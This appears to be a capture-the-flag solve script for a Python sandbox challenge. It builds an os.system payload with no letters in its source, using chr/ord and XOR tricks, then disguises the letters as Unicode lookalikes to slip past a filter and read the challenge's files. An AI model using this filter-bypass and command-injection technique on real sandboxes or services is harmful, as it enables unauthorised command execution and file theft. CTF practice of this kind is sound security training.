def string_to_chr(string):
    return '+'.join([f"chr({ord(char)})" for char in string])
cmd = "cat /usr/local/sansalpha.py"
# cmd = "cat blargh/flag.txt"
payload = "__import__(chr(ord('^') ^ ord('1'))+chr(ord('.') ^ ord(']'))).system("+string_to_chr(cmd)+")"

new_char = "ᵃᵇᶜᵈᵉᶠᵍʰᵢʲᵏˡᵐⁿᵒᵖ𝐪ʳˢᵗᵘᵛʷˣʸᶻᴬᴮCᴰᴱFᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾＱᴿ𝖲ᵀᵁⱽᵂⅩ𝖸Z"
new_payload = ""
for i in range(len(payload)):
    index = ord(payload[i]) - ord('a')
    if index >= 0 and index < len(new_char):
        new_payload += new_char[index]
    else:
        new_payload += payload[i]
print(new_payload)